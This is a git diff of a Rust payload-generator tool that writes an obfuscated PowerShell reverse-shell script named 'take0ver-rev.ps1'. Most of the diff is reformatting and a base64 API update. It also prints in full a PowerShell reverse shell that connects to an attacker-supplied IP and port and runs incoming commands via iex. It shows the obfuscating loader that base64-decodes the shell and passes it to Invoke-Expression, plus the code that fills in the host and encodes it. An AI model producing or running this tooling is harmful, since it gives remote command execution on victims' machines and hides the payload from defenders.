@@ -1,7 +1,7 @@
 //! Generates your payloads :)
 
 // External Libraries
-use base64::encode;
+use base64::{engine::general_purpose, Engine as _};
 use colored::*;
 
 // Standard Libraries
@@ -10,8 +10,8 @@ use std::path::PathBuf;
 
 // Everything below is the payload generator
 pub fn generate(host: String, port: String) {
-// Payload template
-// START //
+    // Payload template
+    // START //
     let file = r#"function x($b, $s) {
     $newBytes = @();
     for ($i = 0; $i -lt $b.Count; $i++) {
@@ -39,25 +39,25 @@ $_dx3d = [system.Text.Encoding]::UTF8.getString($_dx3e);
  
 Invoke-Expression $_dx3d"#;
 
-	let payload = r#"$_rs = @'
+    let payload = r#"$_rs = @'
 $client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>', <ATTACKER-PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 '@;"#;
-// END //
-    
+    // END //
+
     // Inserts the attacker ip and port into the payload
     let payload = &payload.replace("<ATTACKER-IP>", &host);
     let payload = &payload.replace("<ATTACKER-PORT>", &port);
 
     // Base 64 encodes the payload
-    let payload = &encode(payload);
+    let payload = &general_purpose::STANDARD.encode(payload);
     // Inserts the base 64 encoded payload into the file
     let new_payload = file.replace("<B64-REPLACE>", payload);
-    
+
     // Calls write(payload_as_string)
     write(new_payload);
 }
 
-// Writes to new payload 
+// Writes to new payload
 fn write(payload: String) {
     println!("{}", "Generating payload...".green().bold());
     let path = "./take0ver-rev.ps1";
@@ -66,6 +66,14 @@ fn write(payload: String) {
     // Write to the file
     fs::write(full_path.clone(), payload).expect("Unable to write file");
     // Get full path to payload
-    let canonicalize = fs::canonicalize(full_path).unwrap().into_os_string().into_string().unwrap();
-    println!("{} \"{}\"", "Generated payload at".green().bold(), canonicalize.blue().bold());
-} 
+    let canonicalize = fs::canonicalize(full_path)
+        .unwrap()
+        .into_os_string()
+        .into_string()
+        .unwrap();
+    println!(
+        "{} \"{}\"",
+        "Generated payload at".green().bold(),
+        canonicalize.blue().bold()
+    );
+}
